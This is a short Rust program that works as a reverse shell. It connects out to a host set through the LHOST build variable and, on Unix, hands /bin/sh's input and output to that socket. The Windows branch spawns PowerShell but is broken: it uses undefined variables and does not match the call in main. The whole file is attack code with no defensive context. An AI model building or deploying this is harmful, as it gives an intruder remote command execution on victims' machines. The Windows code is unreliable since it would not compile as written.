use std::{
    net::TcpStream,
    process::{Command, Stdio},
};

#[cfg(windows)]
fn establish_stream() {
    let child = Command::new("powershell")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();

    let mut buf = vec![];
    s.read(&mut buf);
    match process.stdin.unwrap().write_all(&buf) {
        Err(why) => panic!("couldn't write to shell stdin: {}", why.description()),
        Ok(_) => println!("send command to shell"),
    }

    match process.stdout.unwrap().read_to_end(&mut buf) {
        Err(why) => panic!("couldn't read shell stdout: {}", why.description()),
        Ok(_) => s.write_all(&buf).unwrap(),
    }
}

#[cfg(unix)]
fn establish_stream(stream: TcpStream) {
    use std::os::fd::{AsRawFd, FromRawFd};
    let fd = stream.as_raw_fd();

    Command::new("/bin/sh")
        .stdin(Stdio::from(unsafe { Stdio::from_raw_fd(fd) }))
        .stdout(Stdio::from(unsafe { Stdio::from_raw_fd(fd) }))
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let home = option_env!("LHOST").unwrap_or("localhost:8000");
    let s = TcpStream::connect(home).unwrap();

    establish_stream(s);
    Ok(())
}
